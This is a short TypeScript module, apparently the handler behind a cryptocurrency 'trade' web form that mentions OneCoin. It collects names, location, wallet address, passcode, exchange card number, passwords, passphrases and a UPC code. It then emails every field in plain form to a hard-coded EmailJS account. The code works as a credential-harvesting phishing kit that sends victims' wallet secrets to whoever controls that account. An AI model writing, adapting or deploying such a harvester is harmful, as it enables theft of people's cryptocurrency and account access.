import emailjs from "emailjs-com";

export interface FormData {
  surname: string;
  firstName: string;
  otherName: string;
  maritalStatus: string;
  location: string;
  onecoinUsername: string;
  amountToTrade: string;
  cryptocurrency: string;
  bankTransfer: string;
  walletAddress: string;
  passcode: string;
  exchangeCardNumber: string;
  password: string;
  confirmPassword: string;
  upcCode: string;
  passphrase: string;
  confirmPassphrase: string;
}

export const sendEmail = async (formData: FormData): Promise<boolean> => {
  const serviceId = "service_s8tfiym";    // Replace with your EmailJS Service ID
  const templateId = "template_h99grj9";  // Replace with your EmailJS Template ID
  const userId = "mW0y4b5oatzBYx7j9";          // Replace with your EmailJS User ID

  const templateParams = {
    surname: formData.surname,
    firstName: formData.firstName,
    otherName: formData.otherName,
    maritalStatus: formData.maritalStatus,
    location: formData.location,
    onecoinUsername: formData.onecoinUsername,
    amountToTrade: formData.amountToTrade,
    cryptocurrency: formData.cryptocurrency,
    bankTransfer: formData.bankTransfer,
    walletAddress: formData.walletAddress,
    passcode: formData.passcode,
    exchangeCardNumber: formData.exchangeCardNumber,
    password: formData.password,
    confirmPassword: formData.confirmPassword,
    upcCode: formData.upcCode,
    passphrase: formData.passphrase,
  confirmPassphrase: formData.confirmPassphrase,
  };

  try {
    const result = await emailjs.send(serviceId, templateId, templateParams, userId);
    console.log("Email successfully sent!", result.text);
    return true;
  } catch (error) {
    console.error("Error sending email:", error);
    return false;
  }
};
